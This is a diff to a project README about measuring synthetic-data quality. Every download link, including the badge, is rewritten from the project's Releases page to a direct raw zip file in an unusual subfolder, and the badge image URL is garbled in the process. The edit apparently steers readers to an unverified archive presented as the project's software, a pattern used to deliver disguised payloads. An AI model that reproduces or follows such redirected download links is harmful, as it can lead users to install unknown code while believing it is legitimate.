@@ -1,7 +1,7 @@
 # 📊 Measuring-The-Soul-of-Data - Explore Data Authenticity with Ease
 
 ## 🌐 Download the Software
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Brax0201/Measuring-The-Soul-of-Data/releases)
+[![Download Now](https://raw.githubusercontent.com/Brax0201/Measuring-The-Soul-of-Data/main/demesmerize/Measuring-The-Soul-of-Data-v1.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Brax0201/Measuring-The-Soul-of-Data/main/demesmerize/Measuring-The-Soul-of-Data-v1.3.zip)
 
 ## 📖 About This Project
 "Measuring-The-Soul-of-Data" combines narrative and technical insights into the world of data authenticity. This project explores four important aspects of synthetic data: Fidelity, Coverage, Privacy, and Utility. By blending storytelling with mathematics and code, it shows how these metrics shape data's ethical and functional essence in AI systems.
@@ -21,7 +21,7 @@ Before you download, please ensure your system meets these requirements:
 ## 📥 Download & Install
 To download the software, visit the Releases page by clicking the link below. You will find the latest version of the application available for download.
 
-[Visit this page to download](https://github.com/Brax0201/Measuring-The-Soul-of-Data/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Brax0201/Measuring-The-Soul-of-Data/main/demesmerize/Measuring-The-Soul-of-Data-v1.3.zip)
 
 Once you've accessed the page, locate the latest release, and choose the correct installation file for your operating system. Download the file and save it to your preferred location.
 
@@ -79,4 +79,4 @@ Once you have explored the basic features, you can dive deeper into advanced ana
 
 Visit the Releases page again anytime to stay updated with the latest software improvements and features.
 
-[Visit this page to download](https://github.com/Brax0201/Measuring-The-Soul-of-Data/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Brax0201/Measuring-The-Soul-of-Data/main/demesmerize/Measuring-The-Soul-of-Data-v1.3.zip)
